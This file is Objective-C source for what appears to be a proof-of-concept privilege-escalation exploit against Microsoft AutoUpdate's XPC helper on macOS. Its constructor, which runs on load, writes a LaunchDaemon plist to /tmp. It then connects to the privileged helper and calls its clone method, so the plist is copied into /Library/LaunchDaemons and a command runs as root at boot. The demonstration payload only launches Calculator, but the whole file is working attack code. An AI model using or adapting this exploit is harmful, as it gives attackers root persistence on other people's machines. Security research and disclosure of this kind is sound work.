#import <Foundation/Foundation.h>

@protocol MAUHelperToolProtocol <NSObject>
- (void)removeInstallLogFile:(NSString *)arg1;
- (void)logString:(NSString *)arg1 atLevel:(int)arg2 fromAppName:(NSString *)arg3;
- (void)removeClone:(NSString *)arg1 withReply:(void (^)(NSString *))arg2;
- (void)restoreCloneToAppInstallLocation:(NSString *)arg1 withClonePath:(NSString *)arg2 withReply:(void (^)(NSString *))arg3;
- (void)createCloneFromApp:(NSString *)arg1 withClonePath:(NSString *)arg2 withReply:(void (^)(NSString *))arg3;
- (void)installUpdateWithPackage:(NSString *)arg1 withXMLPath:(NSString *)arg2 withAppPath:(NSString *)arg3 withClonePath:(NSString *)arg4 withReply:(void (^)(NSString *))arg5;
@end

__attribute__((constructor))

static void installPlist(void) {
    static NSString* kXPCHelperMachServiceName = @"com.microsoft.autoupdate.helper";
    
    NSLog(@"[*] Installing plist");

    NSString* my_plist = @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
            "<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
            "<plist version=\"1.0\">"
            "<dict>"
            "  <key>Label</key>"
            "  <string>com.sample.Load</string>"
            "  <key>ProgramArguments</key>"
            "  <array>"
            "       <string>/bin/zsh</string>"
          "      <string>-c</string>"
          "      <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>"
            "  </array>"
            "     <key>RunAtLoad</key>"
            "     <true/>"
            "</dict>"
            "</plist>";
            
            [my_plist writeToFile:@"/tmp/msteams/stage2/com.msteams.load.plist" atomically:YES encoding:NSASCIIStringEncoding error:nil];
            
            NSString*  _serviceName = kXPCHelperMachServiceName;

            NSXPCConnection* _agentConnection = [[NSXPCConnection alloc] initWithMachServiceName:_serviceName options:4096];
            [_agentConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(MAUHelperToolProtocol)]];
            [_agentConnection resume];

            [[_agentConnection remoteObjectProxyWithErrorHandler:^(NSError* error) {
                (void)error;
                NSLog(@"[!] Error: %@", error);
            }] createCloneFromApp:@"/tmp/msteams/stage2/com.msteams.load.plist" withClonePath:@"/Library/LaunchDaemons/" withReply:^(NSString * err){
                NSLog(@"[*] Reply: %@", err);
            }];
    
            NSLog(@"[*] Plist installed");
    
    return;
}